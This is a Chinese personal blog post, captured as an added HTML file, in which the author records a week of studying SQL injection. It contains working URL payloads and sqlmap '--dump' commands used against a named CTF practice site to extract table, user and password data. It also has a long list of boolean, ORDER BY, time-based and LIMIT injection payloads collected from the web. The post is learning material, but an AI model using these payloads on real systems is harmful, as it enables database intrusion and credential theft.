@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>第六周，数据库相关注入语句的收集和学习 | Jay&#39;s blog</title>
+  <meta name="description" content="第六周：数据库相关注入语句的收集和学习union 联合注入在使用order by确认了列之后就可以使用union。 &#x2F;&#x2F;查看database http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df%27%20union%20select%201,database()%23 &#x2F;&#x2F;接下来可以查看表名了（这里使用了全局变量database()，单">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第六周，数据库相关注入语句的收集和学习">
+<meta property="og:url" content="http://www.jaydodson.top/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Jay&#39;s blog">
+<meta property="og:description" content="第六周：数据库相关注入语句的收集和学习union 联合注入在使用order by确认了列之后就可以使用union。 &#x2F;&#x2F;查看database http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df%27%20union%20select%201,database()%23 &#x2F;&#x2F;接下来可以查看表名了（这里使用了全局变量database()，单">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.jaydodson.top/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-1.png">
+<meta property="og:image" content="http://www.jaydodson.top/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-2.png">
+<meta property="og:image" content="http://www.jaydodson.top/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-3.png">
+<meta property="og:image" content="http://www.jaydodson.top/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-4.png">
+<meta property="og:image" content="http://www.jaydodson.top/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-5.png">
+<meta property="article:published_time" content="2019-09-08T04:43:43.000Z">
+<meta property="article:modified_time" content="2020-02-28T12:15:28.822Z">
+<meta property="article:author" content="Jay Dodson">
+<meta property="article:tag" content="mysql">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.jaydodson.top/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-1.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://www.jaydodson.top/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Jay&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favi.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/jaydodson" target="_blank">
+          <img class="img-circle img-rotate" src="/images/THE1.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">m0s</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">信安之路。</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Hangzhou, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/jaydodson" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Ubuntu/">Ubuntu</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/">信安之路</a><span class="category-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/" rel="tag">Ubuntu</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/" rel="tag">nginx</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-fpm/" rel="tag">php-fpm</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/Ubuntu/" style="font-size: 13.33px;">Ubuntu</a> <a href="/tags/mysql/" style="font-size: 14px;">mysql</a> <a href="/tags/nginx/" style="font-size: 13px;">nginx</a> <a href="/tags/php-fpm/" style="font-size: 13px;">php-fpm</a> <a href="/tags/sql/" style="font-size: 13.67px;">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 13px;">sql注入</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/">信安之路</a>
+              </p>
+              <p class="item-title">
+                <a href="/2019/09/29/WEB%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0/" class="title">第九周，WEB页面解析的流程学习</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2019-09-29T05:43:43.000Z" itemprop="datePublished">2019-09-29</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/">信安之路</a>
+              </p>
+              <p class="item-title">
+                <a href="/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" class="title">第六周，数据库相关注入语句的收集和学习</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2019-09-08T04:43:43.000Z" itemprop="datePublished">2019-09-08</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Ubuntu/">Ubuntu</a>
+              </p>
+              <p class="item-title">
+                <a href="/2019/08/27/Ubuntu18-04%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" class="title">Ubuntu18.04网络配置</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2019-08-27T09:26:57.000Z" itemprop="datePublished">2019-08-27</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Ubuntu/">Ubuntu</a>
+              </p>
+              <p class="item-title">
+                <a href="/2019/08/27/Ubuntu18-04%E6%96%B0%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/" class="title">Ubuntu18.04新特性总结</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2019-08-27T09:17:19.000Z" itemprop="datePublished">2019-08-27</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/">信安之路</a>
+              </p>
+              <p class="item-title">
+                <a href="/2019/08/25/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/" class="title">第四周，数据库系统功能相关学习</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2019-08-25T11:33:51.000Z" itemprop="datePublished">2019-08-25</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第六周：数据库相关注入语句的收集和学习"><span class="toc-number">1.</span> <span class="toc-text">第六周：数据库相关注入语句的收集和学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#union-联合注入"><span class="toc-number">1.1.</span> <span class="toc-text">union 联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-number">1.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-number">1.3.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于时间的盲注"><span class="toc-number">1.4.</span> <span class="toc-text">基于时间的盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网上收集的payload"><span class="toc-number">2.</span> <span class="toc-text">网上收集的payload</span></a></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-数据库相关注入语句的收集和学习" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      第六周，数据库相关注入语句的收集和学习
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" class="article-date">
+	  <time datetime="2019-09-08T04:43:43.000Z" itemprop="datePublished">2019-09-08</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/">信安之路</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/mysql/" rel="tag">mysql</a>, <a class="article-tag-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h2 id="第六周：数据库相关注入语句的收集和学习"><a href="#第六周：数据库相关注入语句的收集和学习" class="headerlink" title="第六周：数据库相关注入语句的收集和学习"></a>第六周：数据库相关注入语句的收集和学习</h2><h3 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h3><p>在使用order by确认了列之后就可以使用union。</p>
+<p>//查看database</p>
+<p><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df%27%20union%20select%201,database()%23</code><br><img src="/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-1.png" alt></p>
+<p>//接下来可以查看表名了（这里使用了全局变量database()，单双引号会过滤）</p>
+<p><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df%27%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</code><br><img src="/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-2.png" alt></p>
+<p>//猜测ctf是flag所在的表，接下来查看ctf表中的列名（因为过滤引号所以使用了ctf的16进制来绕过）</p>
+<p><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x637466%23</code><br><img src="/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-3.png" alt></p>
+<p>//爆出列名之后就可以直接查看内容了</p>
+<p><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df%27%20union%20select%201,group_concat(user)%20from%20ctf%23</code><br><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df%27%20union%20select%201,group_concat(pw)%20from%20ctf%23</code></p>
+<p>//得到想要的</p>
+<p><img src="/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-4.png" alt><br><img src="/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/6-5.png" alt></p>
+<p>//如果使用sqlmap进行本次注入，url应为：<code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27</code></p>
+<p><code>sqlmap -u &quot;chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df%27&quot; --hex</code><br><code>sqlmap -u &quot;chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --hex --dbs</code><br><code>sqlmap -u &quot;chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --hex -D sae-chinalover --tables</code><br><code>sqlmap -u &quot;chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --hex -D sae-chinalover -T ctf --dump</code></p>
+<blockquote>
+<p>补充：<br>user() version() database() @@datadir @@hostname @@version @@version_compile_os 常用的一些全局函数</p>
+</blockquote>
+<blockquote>
+<p>其他payload</p>
+<blockquote>
+<p><code>&#39;and column_name is null--+</code> //猜列名，列名存在不会报错，不存在报错</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><code>&#39;and table_name.column is null--+</code> //在猜出column之后可以猜table</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><code>&#39;and database_name.table is null--+</code> //同理可猜database</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><code>&#39;and (select count(*) from table_name)&gt;0--+</code> //猜库里的其他表</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><code>&#39;or user like &#39;%a%</code> //前面的<code>&#39;</code>是用来闭合语句中原本就有的一个单引号</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><code>&#39;or user=&#39;admin</code> //这两句都是用来猜字段内容的</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><code>&#39;and user.user is null--+</code> //列表对应关系</p>
+</blockquote>
+</blockquote>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>语句：<code>and (select 1 from (select count(*) concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></p>
+<blockquote>
+<p>rand() //用于产生一个0~1的随机数</p>
+</blockquote>
+<blockquote>
+<p>floor() //向下取整</p>
+</blockquote>
+<blockquote>
+<p>rand(）生成数使用floor()向下取整固定为0，但将rand()*2后向下取整则不固定为0,1</p>
+</blockquote>
+<blockquote>
+<p>mysql中默认存在<code>information_schema</code>表，存在大量数据，报错只基于前面几条数据</p>
+<blockquote>
+<p>rand() //随机报错</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>rand(0) //必然报错，起始数数据是 011011</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>count(*) //目的是计数整张表有多少数据</p>
+</blockquote>
+</blockquote>
+<p>补充：</p>
+<ul>
+<li>updatexm()函数</li>
+<li>extractvalue(1,concat(0x7e,(select datebase())))</li>
+<li>exp(~(select * from (select user())a))</li>
+</ul>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>原理：报错信息不回显，但页面会变化</p>
+<ul>
+<li>1’ and 1=2– //不显示任何东西</li>
+<li>1’ and 1=1– //显示id=1的东西</li>
+</ul>
+<p>语句与错误型注入基本相同</p>
+<p><code>&#39; and ord(mid(version())1,1)&amp;128&gt;0</code> //查第一个字符串的8个位来确定第一个字符串</p>
+<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>原理：sleep()函数能产生延时，返回0被中断返回1</p>
+<p><code>substr(str,pos,len)</code></p>
+<p><code>substring(str FROM pos FOR len)</code> //可以不用逗号</p>
+<p><code>substring_index(字符串，关键字，出现次数)</code> //返回截断</p>
+<p>配合if语句：<code>if(expr1,expr2,expr3)</code></p>
+<p>配合<code>select case when</code></p>
+<p>除了sleep()函数，benchmark()函数也可,<code>benchmark(次数,执行函数[例：sha(1)])</code><br>笛卡尔积也可<code>select count(*) from A,B,C</code> //ABC都是某张表，相同表也行</p>
+<h2 id="网上收集的payload"><a href="#网上收集的payload" class="headerlink" title="网上收集的payload"></a>网上收集的payload</h2><p>1：BOOL SQLINJECTION</p>
+<pre><code>\
+&apos;
+&quot;
+%df&apos;
+%df&quot;
+and 1=1
+and 1=2
+&apos; and &apos;1&apos;=&apos;1
+&apos; and &apos;1&apos;=&apos;2
+&quot; and &quot;1&quot;=&quot;1
+&quot; and &quot;1&quot;=&quot;2
+) and (1=1
+) and (1=2
+&apos;) and (&apos;1&apos;=&apos;1
+&apos;) and (&apos;1&apos;=&apos;2
+%&apos; and 1=1 and &apos;%&apos;=&apos;
+%&apos; and 1=2 and &apos;%&apos;=&apos;x
+%&apos;) and 1=1 and (&apos;%&apos;=&apos;
+%&apos;) and 1=2 and (&apos;%&apos;=&apos;x
+OR 1=1
+OR 1=2
+&apos; OR 1=1-- -
+&apos; OR 1=2-- -
+) OR 1=1-- -
+) OR 1=2-- -
+&apos;) OR 1=1-- -
+&apos;) OR 1=2-- -
+&quot; OR &quot;1&quot;=&quot;1
+&quot; OR &quot;1&quot;=&quot;2
+&apos; OR &apos;1&apos;=&apos;1
+&apos; OR &apos;1&apos;=&apos;2
+) OR (1=1
+) OR (1=2
+&apos;) OR (&apos;1&apos;=&apos;1
+&apos;) OR (&apos;1&apos;=&apos;2</code></pre><p>2：ORDER BY SQLINJECTION fuzz payload</p>
+<pre><code>(case when(1=1) then 1 else (select 1 union select 2) end)
+(case when(1=2) then 1 else (select 1 union select 2) end)
+,(1-(case when(1=1) then 1 else (select 1 union select 2) end))
+,(1-(case when(1=2) then 1 else (select 1 union select 2) end))
+,1=if((1=1),1,(select 1 union select 2))
+,1=if((1=2),1,(select 1 union select 2))
+,If((1=1),1,(select 1 union select 2))-- -
+,If((1=2),1,(select 1 union select 2))-- -
+,If((1=1),sleep(4),(select 1 union select 2))-- -
+-IF((1=1),1,(SELECT 1 UNION SELECT 2))-- -
+-IF((1=2),1,(SELECT 1 UNION SELECT 2))-- -
+-(case when(1=1) then 1 else (select 1 union select 2) end)
+-(case when(1=2) then 1 else (select 1 union select 2) end)</code></pre><p>3：TIME-BASE SQLINJECTION</p>
+<pre><code>&apos;%2b(if((1=1 and sleep(4)),1,(select 1 union select 2)))%2b&apos;a
+-IF((1=1),sleep(4),(SELECT 1 UNION SELECT 2))-- -
+&apos;;(SELECT 1 FROM(SELECT(sleep(4)))lWuP)-- -
+;SELECT sleep(4)
+);SELECT sleep(4)-- -
+;SELECT sleep(4)-- -
+;(SELECT 1 FROM(SELECT(sleep(4)))lWuP)-- -
+&apos; AND SLEEP(4)%23
+AND sleep(4)
+&apos; AND sleep(4) AND &apos;1&apos;=&apos;1
+&apos;) AND sleep(4) AND (&apos;1&apos;=&apos;1
+) AND sleep(4) AND (1=1
+&quot; AND sleep(4) AND &quot;1&quot;=&quot;
+&apos;) and (select(0)from(select(sleep(4)))x)-- -
+and (select(0)from(select(sleep(4)))x)
+and (select(0)from(select(sleep(4)))x) and 1=1
+&apos; and (select(0)from(select(sleep(4)))x) and &apos;1&apos;=&apos;1
+&quot; and (select(0)from(select(sleep(4)))x) and &quot;1&quot;=&quot;1
+) and (select(0)from(select(sleep(4)))x) and (1=1
+&apos;) and (select(0)from(select(sleep(4)))x) and (&apos;1&apos;=&apos;1
+rlike (select(0)from(select(sleep(4)))x) and 1=1
+&apos; rlike (select(0)from(select(sleep(4)))x) and &apos;1&apos;=&apos;1
+) rlike (select(0)from(select(sleep(4)))x) and (1=1
+&apos;) rlike (select(0)from(select(sleep(4)))x) and (&apos;1&apos;=&apos;1
+;waitfor delay &apos;0:0:4&apos; -- -
+&apos;;waitfor delay &apos;0:0:4&apos; -- -
+);waitfor delay &apos;0:0:4&apos; -- -
+&apos;);waitfor delay &apos;0:0:4&apos; -- -
+if(now()=sysdate(),sleep(4),0)/*&apos;XOR(if(now()=sysdate(),sleep(4),0))OR&apos;&quot;XOR(if(now()=sysdate(),sleep(4),0))OR&quot;*/
+(SELECT * FROM(SELECT(sleep(4)))lWuP)</code></pre><p>4:LIMIT SQLINJECTION </p>
+<pre><code>procedure analyse(extractvalue(1,if(1=1,benchmark(5000000,md5(1)),2)),1)</code></pre>
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://www.jaydodson.top/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" title="第六周，数据库相关注入语句的收集和学习" target="_blank" rel="external">http://www.jaydodson.top/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/</a>
+    </li>
+    
+    <li class="post-copyright-license">
